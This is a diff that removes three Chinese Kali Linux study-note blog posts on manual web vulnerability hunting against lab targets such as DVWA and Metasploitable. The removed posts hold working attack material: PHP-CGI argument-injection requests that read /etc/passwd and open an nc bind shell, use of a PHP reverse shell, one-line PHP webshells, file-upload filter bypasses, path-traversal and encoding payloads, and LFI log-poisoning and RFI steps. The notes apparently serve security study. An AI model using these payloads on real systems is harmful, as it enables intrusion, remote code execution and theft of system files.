@@ -240,783 +240,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%9B%9B)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E/" itemprop="url">Kali Linux笔记(四十四)：手动漏洞挖掘--默认安装存在漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  762 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-问答"><a href="#1-问答" class="headerlink" title="1. 问答"></a>1. 问答</h4><ul>
-<li>Conky（性能监测工具）<ul>
-<li><a href="https://weather.yahoo.com/（城市代码）" target="_blank" rel="noopener">https://weather.yahoo.com/（城市代码）</a></li>
-<li>.conkyrc（Beijing：2151330）</li>
-</ul>
-</li>
-<li>Goagent<ul>
-<li>不要启动多次</li>
-<li>Win+M</li>
-</ul>
-</li>
-<li>Linux4.4内核发布，在虚拟机中可使用主机上的GPU</li>
-</ul>
-<h4 id="2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功"><a href="#2-手动漏洞挖掘–默认安装-▲-2020-1-2-phpMyAdmin进行重放攻击不成功" class="headerlink" title="2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功"></a>2. 手动漏洞挖掘–默认安装 ▲ 2020.1.2 phpMyAdmin进行重放攻击不成功</h4><ul>
-<li>Windows默认安装漏洞</li>
-<li>phpMyAdmin/setup（可以不需要账号密码直接访问）</li>
-<li>Ubuntu/Debian默认安装PHP5-cgi（php位于/usr/bin目录下）</li>
-<li>可直接访问/cgi-bin/php5和/cgi-bin/php（爬不出来的目录）</li>
-</ul>
-<blockquote>
-<pre><code>⭐phpMyAdmin → 通过Burpsuite进行重放（正向）：
-POST http://ip地址/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
-Host:ip地址
-
-&lt;?php 
-passthru(&quot;id/ls/echo &quot;adadsadas&quot; &gt;&gt; a.php&quot;);
-die();
-?&gt;
-
-⭐PHP5-cgi → 通过Burpsuite进行重放（正向）：
-POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
-Host：123
-
-&lt;?php
-    echo system(&apos;cat /etc/passwd&apos;);
-?&gt;
-▲ exec()函数执行命令时，如&apos;cat /etc/passwd&apos; 只返回最后一行的内容
-▲ host无作用，但因为请求头需要host
-
-⭐PHP5-cgi → 通过Burpsuite进行重放（网页主动打开一个侦听端口）：
-POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E %63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D %6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C %61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F %66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F %62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F %70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E %70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F %72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E %72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+ %2D%6E HTTP/1.1
-Host：123
-
-&lt;?php
-    echo system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);
-?&gt;</code></pre></blockquote>
-<h4 id="3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell"><a href="#3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell" class="headerlink" title="3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell"></a>3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell</h4><ul>
-<li>PHP反弹shell<ul>
-<li><strong><code>🔺命令：cp  /usr/share/webshells/php/php-reverse-shell.php ./3.php</code></strong></li>
-<li><strong><code>🔺命令：vi 3.php</code></strong></li>
-<li>修改反弹Shell的ip</li>
-<li>3.php的内容加在POST中的body部分</li>
-<li>nc 侦听端口</li>
-<li>发送POST信息到phpMyAdmin上</li>
-<li>获得Shell</li>
-</ul>
-</li>
-<li>File</li>
-<li>Whereis<ul>
-<li>ifconfig</li>
-</ul>
-</li>
-<li>写入WebShell<ul>
-<li><strong><code>🔺命令：echo &quot;&lt;?php \$cmd=\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt; /var/www/2.php</code></strong>（\用于避免$后面的变量过滤）</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url">Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  753 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-手动漏洞挖掘"><a href="#1-手动漏洞挖掘" class="headerlink" title="1. 手动漏洞挖掘"></a>1. 手动漏洞挖掘</h4><ul>
-<li><?php echo shell_exec($_GET['cmd']);?></li>
-<li>直接上传webshell</li>
-<li>修改文件类型上传webshell<ul>
-<li>Mimetype–文件头、扩展名（判断文件名mimetype 1.jpg）</li>
-<li>一般判断文件类型判断两个方向：1.文件头前10个字节 2.扩展名</li>
-</ul>
-</li>
-<li>修改扩展名上传webshell<ul>
-<li>静态解析文件扩展名时可能无法执行</li>
-</ul>
-</li>
-<li>文件头绕过过滤上传webshell</li>
-<li>上传目录权限（上传权限限制，限制上传文件执行）</li>
-<li>DVWA的Upload（low）：<ul>
-<li>1.正常上传一张图片（.jpg,.png等图片文件，图片不能太大）</li>
-<li>2.<strong><code>🔺命令：vi 1.php</code></strong>（<?php echo shell_exec($_GET['cmd']);?>）</li>
-<li>3.可以正常上传，传入参数：?cmd=id（url中访问1.php）</li>
-<li>▲ 绕过方法：1.上传php 2.修改请求头MAX_SIZE的大小进行重放</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">        $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">        $target_path = $target_path.basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">        if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;].$target_path))&#123;</span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo $target_path.&apos;successfully uploaded!&apos;;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的Upload（medium）：<ul>
-<li>正常上传一张1.png文件，但不能正常上传，需要image/jpeg文件</li>
-<li>▲ 绕过方法：修改请求头的Content-type为image/jpeg进行重放</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">            if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的Upload（high）：<ul>
-<li>▲ 绕过方法：修改请求头中的filename为1.php.jpg进行重放</li>
-<li>防护方法：更严格防护判断文件传输body中对文件类型的定义（但仍不安全）</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">            $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">            $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">            $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">            $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</span><br><span class="line">            $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line"></span><br><span class="line">            if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || $uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                </span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            else&#123;</span><br><span class="line">                </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的Upload（more high）：<ul>
-<li>防护判断文件传输body中对文件类型的定义</li>
-<li>▲ 绕过方法：1.找一张jpeg的图片，修改请求头中的filename为1.php.jpg 2.删除body中的jpeg图片中相关像素的信息，替换为webshell 3.进行重放</li>
-<li>防护方法：修改上一次目录的属主等其他用户的执行权限（权限为620–无执行权限）</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url">Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  874 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-手动漏洞挖掘–目录遍历-文件包含"><a href="#1-手动漏洞挖掘–目录遍历-文件包含" class="headerlink" title="1. 手动漏洞挖掘–目录遍历/文件包含"></a>1. 手动漏洞挖掘–目录遍历/文件包含</h4><ul>
-<li>Directory traversal/File include（有区别/没区别）<ul>
-<li>目录权限限制不严/文件包含</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐区别:
-目录遍历：操作系统内部文件
-文件包含：1.LFI包含本地文件include 
-         2.RFI远程文件包含include（php的include函数）
-▲ Directory Browser和Directory traversal/pass不同</code></pre></blockquote>
-<ul>
-<li>修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞<ul>
-<li><strong><code>🔺命令：sudo vi /etc/php5/cgi/php.ini</code></strong></li>
-<li>allow_url_include=On</li>
-<li><strong><code>🔺命令：sudo /etc/init.d/apache2 restart</code></strong></li>
-</ul>
-</li>
-<li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
-<li>读、写文件、远程执行代码</li>
-</ul>
-</li>
-<li>特征但不绝对<ul>
-<li>?page=a.php</li>
-<li>?home=b.html</li>
-<li>?file=content</li>
-</ul>
-</li>
-<li>经典测试方法<ul>
-<li>?file=../../../../../../../../etc/passwd</li>
-<li>?page=file:///etc/passwd（文件包含的话，可以直接填写绝对路径）</li>
-<li>?home=main.cgi</li>
-<li>?page=<a href="http://www.a.com/1.php（远程文件包含）" target="_blank" rel="noopener">http://www.a.com/1.php（远程文件包含）</a></li>
-<li><a href="http://1.1.1.1/../../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../../dir/file.txt</a></li>
-</ul>
-</li>
-<li>编码绕过字符过滤<ul>
-<li>“.” “%00”–空字符（绕过文件扩展名过滤）</li>
-<li>?file=a.doc%00.php</li>
-<li>使用多种编码尝试</li>
-</ul>
-</li>
-<li>不同操作系统的路径特征字符<ul>
-<li>类Unix系统（根目录:/  目录层级分隔符:/）</li>
-<li>Windows系统（C:/  \或/）</li>
-</ul>
-</li>
-<li>URL编码、双层URL编码<ul>
-<li>%2e%2e%2f        解码：../</li>
-<li>%2e%2e%5c        解码：..\</li>
-<li>%252e%252e%255c  解码：..\（双层编码，%25解码后为%）</li>
-</ul>
-</li>
-<li>Unicode/UTF-8编码<ul>
-<li>..%c0%af         解码：../</li>
-<li>..%u2216</li>
-<li>..%c1%9c         解码：..\</li>
-</ul>
-</li>
-<li>其他系统路径可能使用到的字符<ul>
-<li>file.txt…</li>
-<li>file.txt<spaces></li>
-<li>file.txt````````</li>
-<li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;</li>
-<li>./././file.txt</li>
-<li>nonexistant/../file.txt（不存在的目录）</li>
-</ul>
-</li>
-<li>UNC路径（文件共享路径）<ul>
-<li>\1.1.1.1\path\to\file.txt</li>
-</ul>
-</li>
-<li>本地文件抱哈LFI（一般很难代码执行）<ul>
-<li>查看文件</li>
-<li>代码执行</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐LFI的代码执行
-1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
-3.查看access.log文件www-data用户是否可以进行执行修改
-4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
-5.chmod a+xr apache2（若www-data无权限，假设可修改文件属性）
-6.ls -ld查看权限，保证上级上上级可被www-data执行
-7.?page=/var/log/apache2/access.log（LFI本地文件包含）</code></pre></blockquote>
-<ul>
-<li>远程文件执行RFI<ul>
-<li>出现概率少于LFI，但更容易被利用</li>
-<li>测试 </li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐测试远程文件包含
-1.kali本地侦听80端口（本机端口）
-2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
-3.若kali收到请求，则表示测试成功
-⭐远程文件包含
-1.Kali机子上vi 1.txt
-2.&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-3.Kali机子上service apache2 start（存放在/var/www/html/）
-4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
-<ul>
-<li>DVWA的File Inclusion（low）</li>
-<li>多种绕过方法</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（mediaum）</li>
-<li>绕过方法:ht<a href="http://tp://dvwa/" target="_blank" rel="noopener">http://tp://dvwa/</a>….</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    $file = str_replace(&quot;http://&quot;,&quot;&quot;,$file);</span><br><span class="line">    $file = str_replace(&quot;https://&quot;,&quot;&quot;,$file);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（high）</li>
-<li>暂无绕过方法</li>
-</ul>
